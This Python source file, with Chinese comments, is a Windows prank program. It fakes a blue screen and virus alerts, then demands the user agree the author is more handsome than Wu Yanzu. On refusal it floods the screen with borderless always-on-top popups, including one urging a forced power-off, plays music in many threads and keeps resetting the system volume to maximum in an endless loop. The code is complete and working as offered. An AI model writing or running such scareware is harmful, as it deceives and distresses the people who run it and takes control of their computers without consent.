import tkinter   #ui库,弹窗用的就这个库
import tkinter.messagebox   #与上面同理也是ui库
import random    #生成随机数的库
import threading     #多线程
import time     #延迟用的库
import webbrowser    #打开网站用的库
import shutil
import sys
import time
import getpass
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import pyautogui

import sys
import os
import pygame
import time


def resource_path(relative_path):
    if getattr(sys,'frozen',False):
        base_path=sys._MEIPASS
    else:
        base_path=os.path.abspath(".")
    return os.path.join(base_path,relative_path)

filepath=resource_path(os.path.join("pymusic","monkey.mp3"))

devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(
    IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
volume = cast(interface, POINTER(IAudioEndpointVolume))
volume.SetMasterVolumeLevel(0, None)
pyautogui.press('volumeup')    #调大音量



root = tkinter.Tk()
root.config(bg='blue')
w, h = root.maxsize()
root.geometry("{}x{}".format(w, h))
root.attributes("-topmost",True)
root.resizable(0,0) 
root.overrideredirect(1) 
root.attributes("-toolwindow", 2)
tkinter.messagebox.showinfo("糟糕","你的电脑因为中病毒蓝屏了") 
tkinter.messagebox.showinfo("别紧张","即将为您查杀病毒")  #弹窗
tkinter.messagebox.showerror("错误！",'检测到您未下载插件')
tkinter.messagebox.showerror('提示',"准备下载")
tkinter.messagebox.showinfo("开始","正在启动")
a = tkinter.messagebox.askokcancel("申请权限",'承认我比吴彦祖帅才能查杀病毒')


if a==True:
    tkinter.messagebox.showinfo("好孩子","谢谢，这只是一个小把戏，由于你的诚实，并没有给你带来麻烦。再见！祝你生活愉快")
    sys.exit()
else:
    pass



root.withdraw()
root.destroy()



def punishment4():
    def music():
        pygame.mixer.init()
        track = pygame.mixer.music.load(filepath)
        pygame.mixer.music.play()
        time.sleep(60)
        pygame.mixer.music.stop()
        
    threads = []
    for i in range(50):   #利用多线程，括号就是弹窗数量
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(
            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevel(0, None)
        pyautogui.press('volumeup')    #调大音量
        c = threading.Thread(target=music)
        c.daemon=1
        threads.append(c)
        time.sleep(60)
        threads[i].start()




def punishment1():
    def b():#设置弹窗
        window = tkinter.Tk()
        window.attributes("-topmost",True)
        window.title('我最帅')#弹窗标题
        window.attributes("-topmost",True)
        window.resizable(0,0) 
        window.overrideredirect(1) 
        window.attributes("-toolwindow", 2)
        v = random.randrange(0, abs(window.winfo_screenwidth())+1)#随机数
        n = random.randrange(0, abs(window.winfo_screenheight())+1)
        window.geometry("600x200" + "+" + str(v) + "+" + str(n))#弹窗大小
    
        tkinter.Label(window,
                text='我最帅，不许反驳',
                bg='red',
                font=('楷体', 17),
                width=600, height=200
                ).pack()
        window.mainloop()

    threads = []
    for i in range(50):   #利用多线程，括号就是弹窗数量
        c = threading.Thread(target=b)
        c.daemon=1
        threads.append(c)
        time.sleep(0.15)
        threads[i].start()


def punishment3():
    def b():#设置弹窗
        window = tkinter.Tk()
        window.attributes("-topmost",True)
        window.title('我最帅')#弹窗标题
        v = random.randrange(0, window.winfo_screenwidth())#随机数
        n = random.randrange(0, window.winfo_screenheight())
        window.geometry("600x200" + "+" + str(0) + "+" + str(window.winfo_screenheight()-200))#弹窗大小
        window.attributes("-topmost",True)
        window.resizable(0,0) 
        window.overrideredirect(1) 
        window.attributes("-toolwindow", 2)
        tkinter.Label(window,
                text='我最帅，不许反驳',
                bg='red',
                font=('楷体', 17),
                width=600, height=200
                ).pack()
        window.mainloop()

    threads = []
    for i in range(3):   #利用多线程，括号就是弹窗数量
        c = threading.Thread(target=b)
        c.daemon=1
        threads.append(c)
        time.sleep(0.1)
        threads[i].start()
        
punishment3()
punishment1()

a = tkinter.messagebox.askokcancel("再给你最后一次机会",'我比吴彦祖帅是吗')
if a==True:
    tkinter.messagebox.showinfo("好孩子","谢谢，这只是一个小把戏，由于你的诚实，并没有给你带来麻烦。再见！祝你生活愉快")
    sys.exit()
else:
    pass



def punishment2():

    def b():#设置弹窗
        window = tkinter.Tk()
        window.attributes("-topmost",True)
        window.title('你完蛋了')#弹窗标题
        v = random.randrange(0, window.winfo_screenwidth())#随机数
        n = random.randrange(0, window.winfo_screenheight())
        window.geometry("600x200" + "+" + str(v) + "+" + str(n))#弹窗大小
        window.attributes("-topmost",True)
        window.resizable(0,0) 
        window.overrideredirect(1) 
        window.attributes("-toolwindow", 2)
        tkinter.Label(window,
                text='你电脑要卡死了，快长按电源键强制关机吧',
                bg='yellow',
                font=('楷体', 17),
                width=600, height=200
                ).pack()
        window.mainloop()

    threads = []
    for i in range(10):   #利用多线程，括号就是弹窗数量
        c = threading.Thread(target=b)
        c.daemon=1
        threads.append(c)
        time.sleep(0.1)
        threads[i].start()


punishment2()


def punishment4():
    def music():
        pygame.mixer.init()
        track = pygame.mixer.music.load(filepath)
        pygame.mixer.music.play()
        time.sleep(60)
        pygame.mixer.music.stop()
        
    threads = []
    for i in range(50):   #利用多线程，括号就是弹窗数量
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(
            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevel(0, None)
        pyautogui.press('volumeup')    #调大音量
        c = threading.Thread(target=music)
        c.daemon=1
        threads.append(c)
        threads[i].start()
        time.sleep(60)


def punishment5():
    def b():#设置弹窗
        root = tkinter.Tk()
        root.config(bg='blue')
        w, h = root.maxsize()
        root.geometry("{}x{}".format(w, h))
        root.attributes("-topmost",True)
        root.resizable(0,0) 
        root.overrideredirect(1) 
        root.attributes("-toolwindow", 2)
        text="大圣来也~"
        lab_text=tkinter.Label(root,text=text,fg='#7CCD7C',font=('微软雅黑',60,'italic'),justify='left',padx=10)
        lab_text.pack()
        root.mainloop()

    threads = []
    for i in range(1):   #利用多线程，括号就是弹窗数量
        c = threading.Thread(target=b)
        c.daemon=1
        threads.append(c)
        time.sleep(0.1)
        threads[i].start()


punishment5()

punishment4()

while True:

    volume.SetMasterVolumeLevel(0, None)
    pyautogui.press('volumeup')    #调大音量
    time.sleep(0.5)



 
    
